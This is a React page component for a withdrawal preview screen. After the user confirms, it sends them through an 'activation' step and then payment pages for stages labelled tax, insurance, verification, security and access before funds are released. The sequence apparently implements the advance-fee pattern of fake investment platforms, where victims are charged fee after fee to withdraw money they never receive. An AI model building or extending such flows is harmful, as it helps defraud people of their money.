// src/pages/WithdrawPreview.jsx
import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { proceedWithdraw } from '../services/api';
import './styles/home.css';

export default function WithdrawPreview() {
  const loc = useLocation();
  const nav = useNavigate();
  const { withdrawalId, preview } = loc.state || {};
  const [confirmChecked, setConfirmChecked] = useState(false);
  const [processing, setProcessing] = useState(false);

  const handleProceed = async () => {
    if (!withdrawalId) return alert('Missing withdrawal id — go back and recreate preview.');
    if (!confirmChecked) return alert('Please confirm that the account details above are correct by checking the box.');

    try {
      setProcessing(true);
      // mark pending activation on server (server will return the current withdrawal info)
      const res = await proceedWithdraw(withdrawalId);
      const data = res?.data || {};

      // If server says there's an existing in-progress withdrawal, use that
      const targetId = data.withdrawalId || withdrawalId;
      const stage = data.stage || 'activation';
      const amount = data.amount;

      // Decide where to navigate based on stage
      if (stage === 'activation') {
        nav('/withdraw/activate', { state: { withdrawalId: targetId } });
      } else if (stage === 'tax' || stage === 'insurance' || stage === 'verification' || stage === 'security') {
        // navigate to stage payment page with amount (if provided)
        nav('/withdraw/stage', { state: { withdrawalId: targetId, stage, amount } });
      } else if (stage === 'access') {
        nav('/withdraw/access', { state: { withdrawalId: targetId } });
      } else {
        // fallback to activation
        nav('/withdraw/activate', { state: { withdrawalId: targetId } });
      }
    } catch (err) {
      console.error(err);
      alert(err?.response?.data?.message || 'Failed to proceed');
    } finally {
      setProcessing(false);
    }
  };

  if (!preview) {
    return (
      <div className="page-container">
        <div className="card">
          <h3>Withdraw preview</h3>
          <p className="muted">No preview data available. Go back to Dashboard and create a preview first.</p>
          <div style={{ marginTop: 12 }}>
            <button className="btn-outline" onClick={() => nav('/dashboard')}>Back to dashboard</button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="page-container">
      <div className="card">
        <h3>Withdraw preview</h3>
        <p className="small-muted">Review your withdrawal details below. Proceeding will mark this withdrawal as <strong>pending activation</strong>.</p>

        <div style={{ marginTop: 12 }}>
          <div style={{ marginBottom: 8 }}>
            <strong>Amount:</strong> ${Number(preview.amount || 0).toFixed(2)}
          </div>

          <div style={{ marginBottom: 8 }}>
            <strong>Method:</strong> {preview.method}
          </div>

          <div style={{ marginBottom: 8 }}>
            <strong>Details:</strong>
            <pre style={{ whiteSpace: 'pre-wrap', background: '#f9fafb', padding: 8, borderRadius: 6 }}>{JSON.stringify(preview.details || {}, null, 2)}</pre>
          </div>

          <div style={{ marginTop: 12 }}>
            <label style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <input type="checkbox" checked={confirmChecked} onChange={(e) => setConfirmChecked(e.target.checked)} />
              <span>I confirm the details above are correct.</span>
            </label>
          </div>

          <div style={{ marginTop: 16 }}>
            <h4>Activation required</h4>
            <p className="muted small-muted">
              Before your withdrawal is completed, you must activate your withdrawal. Click <strong>Proceed to activate and withdraw</strong> to continue to the activation requirement.
            </p>
          </div>

          <div style={{ display: 'flex', gap: 10, marginTop: 12 }}>
            <button className="btn" onClick={handleProceed} disabled={processing}>
              {processing ? 'Processing...' : 'Proceed to activate and withdraw'}
            </button>
            <button className="btn-outline" onClick={() => nav('/dashboard')}>Cancel</button>
          </div>
        </div>
      </div>
    </div>
  );
}
